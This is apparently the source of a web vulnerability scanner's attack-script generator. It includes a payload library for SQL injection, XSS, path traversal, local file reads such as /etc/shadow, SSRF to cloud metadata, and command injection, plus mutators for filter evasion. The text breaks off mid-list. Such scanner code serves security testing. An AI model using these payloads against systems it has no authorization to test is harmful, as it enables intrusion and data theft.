"""
scanner.engine.template_generator
---------------------------------
模板化攻击脚本生成器核心模块。

本模块提供完整的模板化攻击脚本生成逻辑，包括：
1. 模板解析与渲染 (TemplateRenderer) - YAML/JSON模板解析与变量渲染
2. 智能Payload生成 (PayloadGenerator) - 多策略Payload生成与变异
3. 攻击脚本构建器 (AttackScriptBuilder) - 完整攻击请求脚本构建
4. 模板管理器 (TemplateManager) - 模板加载、缓存与版本管理
5. 变量解析器 (VariableResolver) - 内置与自定义变量解析

设计原则：
    - 模板与逻辑分离：模板定义攻击模式，代码控制生成逻辑
    - 策略可配置：支持default/aggressive/stealthy等多种策略
    - 可扩展性：支持自定义变量、编码器、变异器
    - 安全性：仅生成验证型payload，不包含破坏性命令

使用示例：
    >>> from scanner.engine.template_generator import AttackScriptBuilder
    >>> builder = AttackScriptBuilder(strategy="default")
    >>> scripts = builder.build_from_plugin(plugin_yaml, target_url, context)
    >>> for script in scripts:
    ...     print(script.request.url, script.payload.original)
"""

import base64
import copy
import hashlib
import json
import os
import random
import re
import string
import time
import urllib.parse
import uuid
from abc import ABC, abstractmethod
from dataclasses import dataclass, field
from enum import Enum
from pathlib import Path
from typing import (
    Any,
    Callable,
    Dict,
    Generator,
    Generic,
    List,
    Optional,
    Set,
    Tuple,
    TypeVar,
    Union,
)
from collections import ChainMap

# 尝试导入yaml，如果不存在则提供降级方案
try:
    import yaml
    YAML_AVAILABLE = True
except ImportError:
    YAML_AVAILABLE = False

import logging

# 配置日志
logger = logging.getLogger(__name__)


# =============================================================================
# 枚举与数据类型定义
# =============================================================================

class AttackStrategy(Enum):
    """
    攻击策略枚举。
    
    Attributes:
        DEFAULT: 默认策略，平衡效率与覆盖率
        AGGRESSIVE: 激进策略，最大化测试覆盖率
        STEALTHY: 隐蔽策略，最小化检测风险
        CUSTOM: 自定义策略，使用用户提供的配置
    """
    DEFAULT = "default"
    AGGRESSIVE = "aggressive"
    STEALTHY = "stealthy"
    CUSTOM = "custom"


class PayloadCategory(Enum):
    """
    Payload类别枚举。
    
    按漏洞类型分类payload，便于管理和选择。
    """
    GENERIC = "generic"
    SQLI = "sqli"
    XSS = "xss"
    PATH_TRAVERSAL = "path_traversal"
    LFI = "lfi"
    RFI = "rfi"
    SSRF = "ssrf"
    XXE = "xxe"
    CMD_INJECTION = "cmd_injection"
    OPEN_REDIRECT = "open_redirect"
    SSTI = "ssti"
    CRLF = "crlf"
    HEADER_INJECTION = "header_injection"


class EncodingMethod(Enum):
    """
    编码方法枚举。
    
    支持多种编码方式，可链式组合。
    """
    NONE = "none"
    URL = "url"
    DOUBLE_URL = "double_url"
    BASE64 = "base64"
    HEX = "hex"
    UNICODE = "unicode"
    HTML_ENTITY = "html_entity"
    JSON = "json"
    UTF7 = "utf7"
    UTF16 = "utf16"


class VariableScope(Enum):
    """
    变量作用域枚举。
    
    定义变量的生命周期和可见范围。
    """
    GLOBAL = "global"       # 全局变量，所有模板可用
    SESSION = "session"     # 会话变量，单次扫描可用
    REQUEST = "request"     # 请求变量，单个请求可用
    TEMPLATE = "template"   # 模板变量，单个模板内可用


# =============================================================================
# 数据实体类
# =============================================================================

@dataclass
class Payload:
    """
    Payload实体类。
    
    表示一个完整的攻击payload，包含原始值、编码后值及相关元数据。
    
    Attributes:
        original: 原始payload字符串
        encoded: 编码后的payload字符串
        category: payload类别
        encoding_method: 使用的编码方法
        mutation_type: 变异类型标识
        risk_level: 风险等级 (1-5)
        description: payload描述
        tags: 标签集合
        source: 来源（内置/自定义/变异）
        
    Example:
        >>> payload = Payload(
        ...     original="<script>alert(1)</script>",
        ...     encoded="%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
        ...     category=PayloadCategory.XSS,
        ...     encoding_method=EncodingMethod.URL
        ... )
    """
    original: str
    encoded: str
    category: PayloadCategory = PayloadCategory.GENERIC
    encoding_method: EncodingMethod = EncodingMethod.NONE
    mutation_type: str = "original"
    risk_level: int = 3
    description: str = ""
    tags: Set[str] = field(default_factory=set)
    source: str = "builtin"
    
    def __hash__(self) -> int:
        return hash((self.original, self.encoded, self.category.value))
    
    def __eq__(self, other: object) -> bool:
        if not isinstance(other, Payload):
            return False
        return self.encoded == other.encoded
    
    def to_dict(self) -> Dict[str, Any]:
        """转换为字典格式"""
        return {
            "original": self.original,
            "encoded": self.encoded,
            "category": self.category.value,
            "encoding_method": self.encoding_method.value,
            "mutation_type": self.mutation_type,
            "risk_level": self.risk_level,
            "description": self.description,
            "tags": list(self.tags),
            "source": self.source,
        }


@dataclass
class AttackRequest:
    """
    攻击请求实体类。
    
    表示一个完整的HTTP攻击请求，包含URL、方法、头部、请求体等。
    
    Attributes:
        url: 完整请求URL
        method: HTTP方法 (GET/POST/PUT/DELETE等)
        headers: 请求头字典
        body: 请求体内容
        cookies: Cookie字典
        timeout: 超时时间（秒）
        follow_redirects: 是否跟随重定向
        proxy: 代理设置
        metadata: 额外元数据
    """
    url: str
    method: str = "GET"
    headers: Dict[str, str] = field(default_factory=dict)
    body: Optional[str] = None
    cookies: Dict[str, str] = field(default_factory=dict)
    timeout: float = 10.0
    follow_redirects: bool = True
    proxy: Optional[str] = None
    metadata: Dict[str, Any] = field(default_factory=dict)
    
    def to_dict(self) -> Dict[str, Any]:
        """转换为字典格式"""
        return {
            "url": self.url,
            "method": self.method,
            "headers": self.headers,
            "body": self.body,
            "cookies": self.cookies,
            "timeout": self.timeout,
            "follow_redirects": self.follow_redirects,
            "proxy": self.proxy,
            "metadata": self.metadata,
        }
    
    def to_curl(self) -> str:
        """
        生成cURL命令。
        
        Returns:
            可执行的cURL命令字符串
        """
        parts = [f"curl -X {self.method}"]
        
        # 添加请求头
        for key, value in self.headers.items():
            parts.append(f"-H '{key}: {value}'")
        
        # 添加Cookie
        if self.cookies:
            cookie_str = "; ".join(f"{k}={v}" for k, v in self.cookies.items())
            parts.append(f"-b '{cookie_str}'")
        
        # 添加请求体
        if self.body:
            parts.append(f"-d '{self.body}'")
        
        # 添加URL
        parts.append(f"'{self.url}'")
        
        return " \\\n  ".join(parts)


@dataclass
class AttackScript:
    """
    攻击脚本实体类。
    
    完整的攻击脚本，包含请求定义、payload、匹配器、元数据等。
    
    Attributes:
        id: 脚本唯一标识
        request: 攻击请求对象
        payload: 使用的payload对象
        matchers: 匹配器列表（用于验证漏洞）
        extractors: 数据提取器列表
        plugin_id: 来源插件ID
        vulnerability_type: 漏洞类型
        severity: 严重程度
        description: 脚本描述
        created_at: 创建时间戳
        context: 攻击上下文信息
    """
    id: str
    request: AttackRequest
    payload: Payload
    matchers: List[Dict[str, Any]] = field(default_factory=list)
    extractors: List[Dict[str, Any]] = field(default_factory=list)
    plugin_id: str = ""
    vulnerability_type: str = ""
    severity: str = "medium"
    description: str = ""
    created_at: float = field(default_factory=time.time)
    context: Dict[str, Any] = field(default_factory=dict)
    
    def to_dict(self) -> Dict[str, Any]:
        """转换为字典格式"""
        return {
            "id": self.id,
            "request": self.request.to_dict(),
            "payload": self.payload.to_dict(),
            "matchers": self.matchers,
            "extractors": self.extractors,
            "plugin_id": self.plugin_id,
            "vulnerability_type": self.vulnerability_type,
            "severity": self.severity,
            "description": self.description,
            "created_at": self.created_at,
            "context": self.context,
        }
    
    def to_json(self) -> str:
        """转换为JSON字符串"""
        return json.dumps(self.to_dict(), ensure_ascii=False, indent=2)


@dataclass
class TemplateVariable:
    """
    模板变量定义。
    
    定义模板中可使用的变量及其属性。
    
    Attributes:
        name: 变量名
        value: 静态值或生成函数
        scope: 变量作用域
        description: 变量描述
        required: 是否必需
        default_value: 默认值
        validator: 值验证函数
    """
    name: str
    value: Union[str, Callable[[], str]]
    scope: VariableScope = VariableScope.GLOBAL
    description: str = ""
    required: bool = False
    default_value: Optional[str] = None
    validator: Optional[Callable[[str], bool]] = None
    
    def get_value(self) -> str:
        """获取变量值"""
        if callable(self.value):
            return self.value()
        return str(self.value)


@dataclass
class Template:
    """
    攻击模板实体类。
    
    表示一个完整的攻击模板，可从YAML/JSON文件加载。
    
    Attributes:
        id: 模板唯一标识
        info: 模板元信息
        requests: 请求定义列表
        variables: 模板变量定义
        imports: 导入的外部模板
        metadata: 额外元数据
        source_path: 模板文件路径
    """
    id: str
    info: Dict[str, Any] = field(default_factory=dict)
    requests: List[Dict[str, Any]] = field(default_factory=list)
    variables: Dict[str, TemplateVariable] = field(default_factory=dict)
    imports: List[str] = field(default_factory=list)
    metadata: Dict[str, Any] = field(default_factory=dict)
    source_path: Optional[str] = None
    
    def get_info(self, key: str, default: Any = None) -> Any:
        """获取模板信息"""
        return self.info.get(key, default)
    
    def get_severity(self) -> str:
        """获取漏洞严重程度"""
        return self.info.get("severity", "medium").lower()
    
    def get_vulnerability_type(self) -> str:
        """获取漏洞类型"""
        return self.info.get("name", self.id)


# =============================================================================
# 变量解析器
# =============================================================================

class VariableResolver:
    """
    变量解析器。
    
    解析模板中的变量引用，支持内置变量、自定义变量和动态生成变量。
    
    变量格式：
        - {{VariableName}}: 标准变量引用
        - {{VariableName:default}}: 带默认值的变量引用
        - {{VariableName|filter}}: 带过滤器的变量引用
    
    内置变量：
        - BaseURL: 基础目标URL
        - Timestamp: 当前时间戳
        - RandomInt: 随机整数
        - RandomString: 随机字符串
        - RandomAlpha: 随机字母数字
        - RandomUUID: 随机UUID
        - MD5: 随机MD5值
        - NewLine: 换行符
        - CRLF: 回车换行
        - Tab: 制表符
        - NullByte: 空字节
        - payload: 当前payload值
    """
    
    # 内置变量定义
    BUILTIN_VARIABLES: Dict[str, TemplateVariable] = {
        "BaseURL": TemplateVariable(
            name="BaseURL",
            value="",  # 动态设置
            scope=VariableScope.SESSION,
            description="基础目标URL"
        ),
        "Timestamp": TemplateVariable(
            name="Timestamp",
            value=lambda: str(int(time.time())),
            scope=VariableScope.REQUEST,
            description="当前Unix时间戳"
        ),
        "TimestampMS": TemplateVariable(
            name="TimestampMS",
            value=lambda: str(int(time.time() * 1000)),
            scope=VariableScope.REQUEST,
            description="当前毫秒时间戳"
        ),
        "RandomInt": TemplateVariable(
            name="RandomInt",
            value=lambda: str(random.randint(1000, 9999)),
            scope=VariableScope.REQUEST,
            description="随机整数(1000-9999)"
        ),
        "RandomString": TemplateVariable(
            name="RandomString",
            value=lambda: ''.join(random.choices(string.ascii_lowercase, k=8)),
            scope=VariableScope.REQUEST,
            description="随机小写字符串(8位)"
        ),
        "RandomAlpha": TemplateVariable(
            name="RandomAlpha",
            value=lambda: ''.join(random.choices(string.ascii_letters + string.digits, k=8)),
            scope=VariableScope.REQUEST,
            description="随机字母数字(8位)"
        ),
        "RandomUUID": TemplateVariable(
            name="RandomUUID",
            value=lambda: str(uuid.uuid4()),
            scope=VariableScope.REQUEST,
            description="随机UUID"
        ),
        "MD5": TemplateVariable(
            name="MD5",
            value=lambda: hashlib.md5(str(random.random()).encode()).hexdigest(),
            scope=VariableScope.REQUEST,
            description="随机MD5值"
        ),
        "SHA1": TemplateVariable(
            name="SHA1",
            value=lambda: hashlib.sha1(str(random.random()).encode()).hexdigest(),
            scope=VariableScope.REQUEST,
            description="随机SHA1值"
        ),
        "NewLine": TemplateVariable(
            name="NewLine",
            value="\n",
            scope=VariableScope.GLOBAL,
            description="换行符"
        ),
        "CRLF": TemplateVariable(
            name="CRLF",
            value="\r\n",
            scope=VariableScope.GLOBAL,
            description="回车换行"
        ),
        "Tab": TemplateVariable(
            name="Tab",
            value="\t",
            scope=VariableScope.GLOBAL,
            description="制表符"
        ),
        "NullByte": TemplateVariable(
            name="NullByte",
            value="\x00",
            scope=VariableScope.GLOBAL,
            description="空字节"
        ),
        "payload": TemplateVariable(
            name="payload",
            value="",  # 动态设置
            scope=VariableScope.REQUEST,
            description="当前payload值"
        ),
        "Hostname": TemplateVariable(
            name="Hostname",
            value="",  # 动态设置
            scope=VariableScope.SESSION,
            description="目标主机名"
        ),
        "Port": TemplateVariable(
            name="Port",
            value="",  # 动态设置
            scope=VariableScope.SESSION,
            description="目标端口"
        ),
        "Scheme": TemplateVariable(
            name="Scheme",
            value="",  # 动态设置
            scope=VariableScope.SESSION,
            description="协议类型(http/https)"
        ),
    }
    
    # 变量引用模式
    VARIABLE_PATTERN = re.compile(r'\{\{(\w+)(?::([^}]*))?(?:\|(\w+))?\}\}')
    
    def __init__(self):
        """
        初始化变量解析器。
        
        创建多层级变量存储结构，按作用域组织变量。
        """
        # 按作用域存储变量
        self._variables: Dict[VariableScope, Dict[str, TemplateVariable]] = {
            scope: {} for scope in VariableScope
        }
        
        # 复制内置变量到全局作用域
        self._variables[VariableScope.GLOBAL].update(self.BUILTIN_VARIABLES)
        
        # 过滤器注册表
        self._filters: Dict[str, Callable[[str], str]] = {
            "upper": str.upper,
            "lower": str.lower,
            "trim": str.strip,
            "url_encode": urllib.parse.quote,
            "url_decode": urllib.parse.unquote,
            "base64_encode": lambda s: base64.b64encode(s.encode()).decode(),
            "base64_decode": lambda s: base64.b64decode(s.encode()).decode(),
            "md5": lambda s: hashlib.md5(s.encode()).hexdigest(),
            "sha1": lambda s: hashlib.sha1(s.encode()).hexdigest(),
            "reverse": lambda s: s[::-1],
            "length": lambda s: str(len(s)),
        }
    
    def set_variable(self, name: str, value: Union[str, Callable[[], str]],
                     scope: VariableScope = VariableScope.SESSION) -> None:
        """
        设置变量值。
        
        Args:
            name: 变量名
            value: 变量值或值生成函数
            scope: 变量作用域
        """
        self._variables[scope][name] = TemplateVariable(
            name=name,
            value=value,
            scope=scope
        )
    
    def get_variable(self, name: str, default: Optional[str] = None) -> Optional[str]:
        """
        获取变量值。
        
        按作用域优先级查找：REQUEST > TEMPLATE > SESSION > GLOBAL
        
        Args:
            name: 变量名
            default: 默认值
            
        Returns:
            变量值或默认值
        """
        # 按优先级顺序查找
        priority_order = [
            VariableScope.REQUEST,
            VariableScope.TEMPLATE,
            VariableScope.SESSION,
            VariableScope.GLOBAL
        ]
        
        for scope in priority_order:
            if name in self._variables[scope]:
                var = self._variables[scope][name]
                return var.get_value()
        
        return default
    
    def resolve(self, template: str, context: Optional[Dict[str, str]] = None) -> str:
        """
        解析模板字符串中的所有变量引用。
        
        Args:
            template: 包含变量引用的模板字符串
            context: 额外的上下文变量（最高优先级）
            
        Returns:
            解析后的字符串
            
        Example:
            >>> resolver = VariableResolver()
            >>> resolver.set_variable("BaseURL", "http://example.com")
            >>> resolver.resolve("{{BaseURL}}/api?q={{payload}}", {"payload": "test"})
            'http://example.com/api?q=test'
        """
        if not template:
            return template
        
        result = template
        context = context or {}
        
        def replace_variable(match: re.Match) -> str:
            """替换单个变量引用"""
            var_name = match.group(1)
            default_value = match.group(2)
            filter_name = match.group(3)
            
            # 优先使用上下文变量
            if var_name in context:
                value = context[var_name]
            else:
                value = self.get_variable(var_name, default_value)
            
            if value is None:
                return match.group(0)  # 保持原样
            
            # 应用过滤器
            if filter_name and filter_name in self._filters:
                value = self._filters[filter_name](value)
            
            return str(value)
        
        # 替换所有变量引用
        result = self.VARIABLE_PATTERN.sub(replace_variable, template)
        
        return result
    
    def register_filter(self, name: str, func: Callable[[str], str]) -> None:
        """
        注册自定义过滤器。
        
        Args:
            name: 过滤器名称
            func: 过滤函数
        """
        self._filters[name] = func
    
    def clear_scope(self, scope: VariableScope) -> None:
        """
        清除指定作用域的所有变量。
        
        Args:
            scope: 要清除的作用域
        """
        self._variables[scope].clear()
    
    def get_available_variables(self) -> List[str]:
        """
        获取所有可用变量名。
        
        Returns:
            变量名列表
        """
        all_vars = set()
        for scope_vars in self._variables.values():
            all_vars.update(scope_vars.keys())
        return sorted(all_vars)


# =============================================================================
# Payload编码器
# =============================================================================

class PayloadEncoder:
    """
    Payload编码器。
    
    提供多种编码方式，支持链式编码和自定义编码规则。
    
    支持的编码方式：
        - URL编码
        - 双重URL编码
        - Base64编码
        - 十六进制编码
        - Unicode编码
        - HTML实体编码
        - JSON编码
        - UTF-7编码
        - UTF-16编码
    
    Example:
        >>> encoder = PayloadEncoder()
        >>> encoded = encoder.encode("<script>", EncodingMethod.URL)
        >>> print(encoded)
        %3Cscript%3E
        
        >>> # 链式编码
        >>> encoded = encoder.chain_encode("<script>", [EncodingMethod.URL, EncodingMethod.BASE64])
    """
    
    @staticmethod
    def url_encode(payload: str) -> str:
        """URL编码"""
        return urllib.parse.quote(payload, safe='')
    
    @staticmethod
    def double_url_encode(payload: str) -> str:
        """双重URL编码"""
        return urllib.parse.quote(
            urllib.parse.quote(payload, safe=''),
            safe=''
        )
    
    @staticmethod
    def base64_encode(payload: str) -> str:
        """Base64编码"""
        return base64.b64encode(payload.encode('utf-8')).decode('utf-8')
    
    @staticmethod
    def hex_encode(payload: str) -> str:
        """十六进制编码"""
        return payload.encode('utf-8').hex()
    
    @staticmethod
    def unicode_encode(payload: str) -> str:
        """Unicode编码"""
        return ''.join(f'\\u{ord(c):04x}' for c in payload)
    
    @staticmethod
    def html_entity_encode(payload: str, all_chars: bool = False) -> str:
        """
        HTML实体编码。
        
        Args:
            payload: 原始字符串
            all_chars: 是否编码所有字符（默认只编码特殊字符）
        """
        if all_chars:
            return ''.join(f'&#x{ord(c):x};' for c in payload)
        return ''.join(
            f'&#x{ord(c):x};' if ord(c) > 127 or c in '<>"\'&' else c
            for c in payload
        )
    
    @staticmethod
    def json_encode(payload: str) -> str:
        """JSON编码"""
        return json.dumps(payload, ensure_ascii=False)[1:-1]  # 去掉引号
    
    @staticmethod
    def utf7_encode(payload: str) -> str:
        """UTF-7编码"""
        result = []
        for char in payload:
            if ord(char) < 128:
                result.append(char)
            else:
                encoded = base64.b64encode(char.encode('utf-16-be')).decode('ascii')
                result.append(f'+{encoded}-')
        return ''.join(result)
    
    @staticmethod
    def utf16_encode(payload: str) -> str:
        """UTF-16编码"""
        return payload.encode('utf-16-le').decode('latin-1')
    
    @classmethod
    def encode(cls, payload: str, encoding: EncodingMethod) -> str:
        """
        根据编码类型对payload进行编码。
        
        Args:
            payload: 原始payload
            encoding: 编码类型
            
        Returns:
            编码后的payload
        """
        encoders: Dict[EncodingMethod, Callable[[str], str]] = {
            EncodingMethod.NONE: lambda x: x,
            EncodingMethod.URL: cls.url_encode,
            EncodingMethod.DOUBLE_URL: cls.double_url_encode,
            EncodingMethod.BASE64: cls.base64_encode,
            EncodingMethod.HEX: cls.hex_encode,
            EncodingMethod.UNICODE: cls.unicode_encode,
            EncodingMethod.HTML_ENTITY: cls.html_entity_encode,
            EncodingMethod.JSON: cls.json_encode,
            EncodingMethod.UTF7: cls.utf7_encode,
            EncodingMethod.UTF16: cls.utf16_encode,
        }
        
        encoder = encoders.get(encoding, lambda x: x)
        return encoder(payload)
    
    @classmethod
    def chain_encode(cls, payload: str, encoding_chain: List[EncodingMethod]) -> str:
        """
        链式编码：按顺序应用多种编码。
        
        Args:
            payload: 原始payload
            encoding_chain: 编码类型列表（按应用顺序）
            
        Returns:
            编码后的payload
            
        Example:
            >>> cls.chain_encode("<script>", [EncodingMethod.URL, EncodingMethod.BASE64])
        """
        result = payload
        for encoding in encoding_chain:
            result = cls.encode(result, encoding)
        return result
    
    @classmethod
    def get_all_encodings(cls, payload: str) -> Dict[str, str]:
        """
        获取payload的所有编码版本。
        
        Args:
            payload: 原始payload
            
        Returns:
            编码类型到编码结果的映射
        """
        return {
            encoding.value: cls.encode(payload, encoding)
            for encoding in EncodingMethod
            if encoding != EncodingMethod.NONE
        }


# =============================================================================
# Payload变异器
# =============================================================================

class PayloadMutator:
    """
    Payload变异器。
    
    根据规则生成payload变体，支持多种变异策略。
    
    变异策略：
        - 大小写变换：随机大小写、全大写、全小写
        - 注释插入：SQL注释、JS注释等
        - 字符替换：特殊字符变换
        - 编码绕过：混合编码、双重编码
        - 分隔符变换：使用不同分隔符
        - 空白字符注入：Tab、换行、空格混合
    
    Example:
        >>> mutator = PayloadMutator()
        >>> variants = mutator.mutate("<script>alert(1)</script>", PayloadCategory.XSS)
        >>> print(len(variants))  # 多个变体
    """
    
    # SQL注释模式
    SQL_COMMENT_PATTERNS = [
        (" ", " /**/ "),
        (" ", " /*!*/ "),
        (" ", " -- "),
        ("'", "\""),
        ("'", "`"),
        ("OR", "||"),
        ("AND", "&&"),
        ("SELECT", "/*!SELECT*/"),
    ]
    
    # XSS变异模式
    XSS_MUTATION_PATTERNS = [
        ("<script>", "<ScRiPt>"),
        ("<script>", "<script/xss>"),
        ("<script>", "<script\n>"),
        ("<script>", "<script\t>"),
        ("<script>", "<svg/onload="),
        ("alert", "prompt"),
        ("alert", "confirm"),
        ("alert", "eval"),
        ("onerror", "onError"),
        ("onerror", "ONERROR"),
        ("onerror", "on\x00error"),
        (" ", "\t"),
        (" ", "\n"),
        (" ", "\r"),
        ("=", "= "),
        ("=", " ="),
    ]
    
    # 路径穿越变异
    PATH_TRAVERSAL_PATTERNS = [
        ("../", "..%2f"),
        ("../", "..%252f"),
        ("../", "..\\"),
        ("../", "..%5c"),
        ("../", "....//"),
        ("../", "..../"),
        ("/", "%2f"),
        ("/", "%252f"),
    ]
    
    # SSTI变异模式
    SSTI_PATTERNS = [
        ("{{", "${"),
        ("{{", "{%"),
        ("{", "{{"),
        ("}", "}}"),
    ]
    
    @classmethod
    def mutate(cls, payload: str, category: PayloadCategory,
               max_variants: int = 20) -> List[str]:
        """
        根据类别生成payload变体。
        
        Args:
            payload: 原始payload
            category: payload类别
            max_variants: 最大变体数量
            
        Returns:
            变体列表（去重后）
        """
        mutator_map = {
            PayloadCategory.SQLI: cls._mutate_sqli,
            PayloadCategory.XSS: cls._mutate_xss,
            PayloadCategory.PATH_TRAVERSAL: cls._mutate_path_traversal,
            PayloadCategory.LFI: cls._mutate_path_traversal,
            PayloadCategory.SSTI: cls._mutate_ssti,
            PayloadCategory.CMD_INJECTION: cls._mutate_cmd,
        }
        
        mutator = mutator_map.get(category, cls._mutate_generic)
        variants = mutator(payload)
        
        # 去重并限制数量
        unique_variants = list(dict.fromkeys(variants))  # 保持顺序去重
        return unique_variants[:max_variants]
    
    @classmethod
    def _mutate_sqli(cls, payload: str) -> List[str]:
        """生成SQL注入payload变体"""
        variants = [payload]
        
        # 大小写变换
        variants.append(payload.upper())
        variants.append(payload.lower())
        variants.append(''.join(
            c.upper() if i % 2 else c.lower()
            for i, c in enumerate(payload)
        ))
        
        # 注释插入
        for orig, replacement in cls.SQL_COMMENT_PATTERNS:
            if orig in payload.upper():
                # 大小写敏感替换
                pattern = re.compile(re.escape(orig), re.IGNORECASE)
                variants.append(pattern.sub(replacement, payload))
        
        # 添加SQL注释后缀
        suffixes = ["--", "#", "/*", "/**/", "/*!50000*/"]
        for suffix in suffixes:
            variants.append(f"{payload}{suffix}")
        
        # 空白字符变异
        variants.append(re.sub(r'\s+', '\t', payload))
        variants.append(re.sub(r'\s+', '/**/', payload))
        
        return variants
    
    @classmethod
    def _mutate_xss(cls, payload: str) -> List[str]:
        """生成XSS payload变体"""
        variants = [payload]
        
        # 大小写混合
        variants.append(payload.upper())
        variants.append(payload.lower())
        variants.append(''.join(
            c.upper() if random.random() > 0.5 else c.lower()
            for c in payload
        ))
        
        # 标签和事件变换
        for orig, replacement in cls.XSS_MUTATION_PATTERNS:
            if orig.lower() in payload.lower():
                variants.append(re.sub(
                    re.escape(orig), replacement, payload,
                    flags=re.IGNORECASE
                ))
        
        # HTML实体编码（部分）
        partial_encoded = ''.join(
            f'&#x{ord(c):x};' if c in '<>"\'=' else c
            for c in payload
        )
        variants.append(partial_encoded)
        
        # 添加Null字节
        if "<" in payload:
            variants.append(payload.replace("<", "<\x00"))
            variants.append(payload.replace("<", "%00<"))
        
        # Tab和换行注入
        variants.append(payload.replace(" ", "\t"))
        variants.append(payload.replace(" ", "\n"))
        variants.append(payload.replace(" ", "\r\n"))
        
        return variants
    
    @classmethod
    def _mutate_path_traversal(cls, payload: str) -> List[str]:
        """生成路径穿越payload变体"""
        variants = [payload]
        
        for orig, replacement in cls.PATH_TRAVERSAL_PATTERNS:
            if orig in payload:
                variants.append(payload.replace(orig, replacement))
        
        # 增加路径层级
        for depth in [3, 5, 8, 10]:
            variants.append(f"{'../' * depth}{payload.lstrip('../')}")
        
        # 添加前缀
        prefixes = ["./", ".../", "....//"]
        for prefix in prefixes:
            if not payload.startswith(prefix):
                variants.append(f"{prefix}{payload}")
        
        return variants
    
    @classmethod
    def _mutate_ssti(cls, payload: str) -> List[str]:
        """生成SSTI payload变体"""
        variants = [payload]
        
        for orig, replacement in cls.SSTI_PATTERNS:
            if orig in payload:
                variants.append(payload.replace(orig, replacement))
        
        # 大小写变换
        variants.append(payload.upper())
        variants.append(payload.lower())
        
        # Jinja2特定变体
        if "{{" in payload:
            variants.append(payload.replace("{{", "${"))
            variants.append(payload.replace("{{", "{%"))
        
        return variants
    
    @classmethod
    def _mutate_cmd(cls, payload: str) -> List[str]:
        """生成命令注入payload变体"""
        variants = [payload]
        
        # 不同命令分隔符
        separators = [";", "|", "||", "&&", "&", "\n", "\r\n"]
        for sep in separators:
            if ";" in payload:
                variants.append(payload.replace(";", sep))
        
        # 反引号和$()变换
        if "`" in payload:
            variants.append(payload.replace("`", "$("))
        elif "$(" in payload:
            variants.append(payload.replace("$(", "`"))
        
        # 大小写变换
        variants.append(payload.upper())
        variants.append(payload.lower())
        
        return variants
    
    @classmethod
    def _mutate_generic(cls, payload: str) -> List[str]:
        """通用变异策略"""
        variants = [payload]
        
        # 大小写变换
        variants.append(payload.upper())
        variants.append(payload.lower())
        
        # URL编码
        variants.append(PayloadEncoder.url_encode(payload))
        
        return variants


# =============================================================================
# Payload生成器
# =============================================================================

class PayloadGenerator:
    """
    Payload生成器。
    
    智能生成攻击payload，支持多策略、多编码、变异生成。
    
    内置Payload库：
        - SQL注入：验证型、时间盲注、报错注入
        - XSS：反射型、DOM型、事件处理器
        - 路径穿越：Unix、Windows、编码绕过
        - SSRF：内网探测、云元数据
        - 命令注入：Unix、Windows命令
    
    Example:
        >>> generator = PayloadGenerator(strategy=AttackStrategy.DEFAULT)
        >>> payloads = generator.generate(PayloadCategory.XSS)
        >>> for p in payloads:
        ...     print(f"{p.original} -> {p.encoded}")
    """
    
    # 内置Payload库
    BUILTIN_PAYLOADS: Dict[PayloadCategory, Dict[str, List[str]]] = {
        PayloadCategory.GENERIC: {
            "default": ["aegis_probe", "test{{RandomInt}}"],
        },
        PayloadCategory.SQLI: {
            "default": [
                "' OR '1'='1",
                "1' AND '1'='1",
                "admin'--",
                "' OR 1=1--",
                "1' ORDER BY 1--",
            ],
            "aggressive": [
                "' OR '1'='1'--",
                "' OR '1'='1'/*",
                "\" OR \"1\"=\"1",
                "1' UNION SELECT NULL--",
                "1' UNION SELECT NULL,NULL--",
                "' AND SLEEP(5)--",
                "'; WAITFOR DELAY '0:0:5'--",
                "1' AND BENCHMARK(10000000,SHA1('test'))--",
                "' OR ''='",
                "1' HAVING 1=1--",
            ],
            "stealthy": [
                "1",
                "1'",
                "''",
            ],
        },
        PayloadCategory.XSS: {
            "default": [
                "<script>alert(1)</script>",
                "<svg onload=alert(1)>",
                "<img src=x onerror=alert(1)>",
            ],
            "aggressive": [
                "<script>alert(1)</script>",
                "<svg/onload=alert(1)>",
                "<img src=x onerror=alert(1)>",
                "\"'><script>alert(1)</script>",
                "javascript:alert(1)",
                "<body onload=alert(1)>",
                "<iframe src=javascript:alert(1)>",
                "<details open ontoggle=alert(1)>",
                "<audio src=x onerror=alert(1)>",
                "<video><source onerror=alert(1)>",
                "<marquee onstart=alert(1)>",
                "<input onfocus=alert(1) autofocus>",
                "<select onfocus=alert(1) autofocus>",
                "<textarea onfocus=alert(1) autofocus>",
                "<keygen onfocus=alert(1) autofocus>",
                "<math><maction xlink:href=\"javascript:alert(1)\">click</maction></math>",
            ],
            "stealthy": [
                "aegis_probe",
                "{{RandomAlpha}}",
            ],
        },
        PayloadCategory.PATH_TRAVERSAL: {
            "default": [
                "../etc/passwd",
                "..%2f..%2fetc%2fpasswd",
                "/etc/passwd",
            ],
            "aggressive": [
                "../etc/passwd",
                "../../etc/passwd",
                "../../../etc/passwd",
                "../../../../etc/passwd",
                "../..//..//..//etc/passwd",
                "..%2f..%2f..%2fetc%2fpasswd",
                "..%252f..%252f..%252fetc%252fpasswd",
                "..\\..\\windows\\win.ini",
                "..%5c..%5cwindows%5cwin.ini",
                "....//....//etc/passwd",
                "/etc/passwd%00",
                "/etc/passwd%00.jpg",
                "php://filter/convert.base64-encode/resource=index.php",
            ],
            "stealthy": [
                "../test",
                "..%2ftest",
            ],
        },
        PayloadCategory.LFI: {
            "default": [
                "/etc/passwd",
                "php://filter/convert.base64-encode/resource=index.php",
                "php://input",
            ],
            "aggressive": [
                "/etc/passwd",
                "/etc/shadow",
                "/etc/hosts",
                "/proc/self/environ",
                "/proc/self/cmdline",
                "/var/log/apache2/access.log",
                "/var/log/nginx/access.log",
                "php://filter/convert.base64-encode/resource=config.php",
                "php://input",
                "file:///etc/passwd",
                "/proc/self/fd/0",
                "/proc/self/fd/1",
            ],
            "stealthy": [
                "index.php",
                "test.txt",
            ],
        },
        PayloadCategory.SSRF: {
            "default": [
                "http://127.0.0.1",
                "http://localhost",
            ],
            "aggressive": [
                "http://127.0.0.1",
                "http://localhost",
                "http://[::1]",
                "http://169.254.169.254",
                "http://169.254.169.254/latest/meta-data/",
                "http://metadata.google.internal/",
                "http://169.254.169.254/openstack/latest/meta_data.json",
                "http://[0:0:0:0:0:ffff:127.0.0.1]",
                "http://0x7f000001",
                "http://2130706433",
                "dict://127.0.0.1:6379/info",
                "gopher://127.0.0.1:6379/_INFO",
            ],
            "stealthy": [
                "http://localhost:80",
                "http://127.0.0.1:80",
            ],
        },
        PayloadCategory.CMD_INJECTION: {
            "default": [
                "; id",
                "| id",
                "$(id)",
            ],
            "aggressive": [
                "; id",
                "| id",
